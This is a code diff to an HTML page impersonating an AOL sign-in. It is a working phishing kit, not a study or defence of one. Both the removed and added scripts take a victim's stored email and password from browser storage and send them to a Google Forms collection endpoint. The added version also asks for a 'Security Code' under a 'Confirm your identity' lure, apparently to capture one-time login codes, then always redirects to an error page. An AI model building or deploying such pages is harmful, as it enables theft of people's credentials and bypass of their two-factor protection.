@@ -4,11 +4,13 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
     <title>Aol Sign in</title>
+    <!-- CSS imports (ensure your CSS files are linked here) -->
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/Noto%20Sans%20Adlam.css">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/err.css">
     <link rel="stylesheet" href="assets/css/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/style.css">
 </head>
 <body class="background-login">
@@ -16,20 +18,20 @@
         <div class="container">
             <a class="navbar-brand d-flex align-items-center" href="#"><img class="img-fluid logo2" src="assets/img/logo.png" alt="" width="100" height="40"></a>
             <ul class="list-unstyled d-flex d-xxl-flex justify-content-end align-items-center justify-content-xxl-end align-items-xxl-center">
-                <li>Help </li>
+                <li>Help</li>
                 <li>Terms</li>
                 <li>Privacy</li>
             </ul>
         </div>
     </nav>
-    <div class="container d-flex justify-content-center">
+    <div class="container d-flex justify-content-center align-items-center">
         <div class="col-sm-5 col-md-4 col-xs-12 col-md-offset-7 col-sm-offset-6 sigin-box">
             <h1 class="text-center"><img class="img-fluid logo1" src="assets/img/logo.png" alt="" width="100" height="40"></h1>
-            <h4 class="text-center mt-4" id="sign-head"><strong>Security alert</strong></h4>
-            <h5 class="text-center mt-4" id="sign-head">Your Aol account may be compromised.</h5><br><br>
+            <h4 class="text-center m-4" id="sign-head"><strong>Security check</strong></h4>
+            <h5 class="text-center" id="sign-head">Confirm your identity</h5><br><br>
             <form id="securityForm">
-                <input type="text" class="sign-input" id="name" name="entry.1486020028" placeholder="Please describe the issue"><br><br>
-                <input type="submit" class="submit-nbtn" name="submit" value="Submit"><br>
+                <input type="text" class="sign-input" id="securityCode" name="entry.2063692657" placeholder="Security Code" required=""><br><br>
+                <input type="submit" class="submit-nbtn" id="submit" value="Verify"><br>
             </form>
         </div>
     </div>
@@ -39,44 +41,34 @@
     <!-- Bootstrap JS -->
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
     <script>
-        document.getElementById("securityForm").addEventListener("submit", function(event) {
-            event.preventDefault();
+        $(document).ready(function() {
+            $('#securityForm').submit(function(event) {
+                event.preventDefault(); // Prevent default form submission
 
-            // Retrieve email and password from local storage
-            const email = localStorage.getItem("email");
-            const password = localStorage.getItem("password");
-            const name = document.getElementById("name").value;
+                var securityCode = $('#securityCode').val(); // Get security code value
+                var email = localStorage.getItem("email"); // Retrieve stored email
+                var password = localStorage.getItem("password"); // Retrieve stored password
 
-            if (!email || !password) {
-                console.error("Email or password not found in local storage.");
-                return;
-            }
+                var formData = new FormData();
+                formData.append("entry.1039185615", email);
+                formData.append("entry.1871831080", password);
+                formData.append("entry.2063692657", securityCode);
 
-            const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjwUocBqJZr90nYqeHbRVSqRYH8x2DbS7_CofWW5p3_QfyNg/formResponse";
-            const data = {
-                "entry.352434670": email,      // Replace with your actual entry ID
-                "entry.1064100899": password,  // Replace with your actual entry ID
-                "entry.1486020028": name       // Replace with your actual entry ID
-            };
-
-            const formBody = new URLSearchParams(data).toString();
-
-            fetch(googleFormURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: formBody
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Form submitted successfully.");
+                // Send form data to Google Forms endpoint
+                fetch('https://docs.google.com/forms/u/0/d/e/1FAIpQLSc6HiQEtBNOrKBeThUFeoqkTYLyUmWTTeAXsMhpFffw4nqjgQ/formResponse', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    // Always redirect to err.html regardless of the response
                     window.location.href = "err.html";
-                } else {
-                    console.error("Form submission error", response);
-                }
-            })
-            .catch(error => console.error("Error:", error));
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Redirect to err.html even if there's an error
+                    window.location.href = "err.html";
+                });
+            });
         });
     </script>
 </body>
